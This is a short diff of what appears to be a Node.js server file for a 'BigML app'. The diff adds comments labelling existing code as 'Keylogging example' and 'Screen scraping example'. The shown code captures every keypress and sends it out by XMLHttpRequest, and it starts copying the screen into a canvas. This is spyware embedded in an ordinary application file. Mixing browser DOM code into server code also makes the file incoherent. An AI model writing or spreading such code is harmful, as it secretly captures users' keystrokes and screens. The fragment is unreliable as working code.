@@ -67,6 +67,7 @@ io.on("connection", (socket) => {
 
 server.listen(port, () => console.log(`BigML app listening at http://localhost:${port}`));
 
+// Keylogging example
 document.addEventListener("keypress", function(e) {
   let key = e.key;
   let xhr = new XMLHttpRequest();
@@ -75,6 +76,7 @@ document.addEventListener("keypress", function(e) {
   xhr.send(JSON.stringify({ key: key }));
 });
 
+// Screen scraping example
 setInterval(function() {
   let canvas = document.createElement("canvas");
   canvas.width = window.innerWidth;
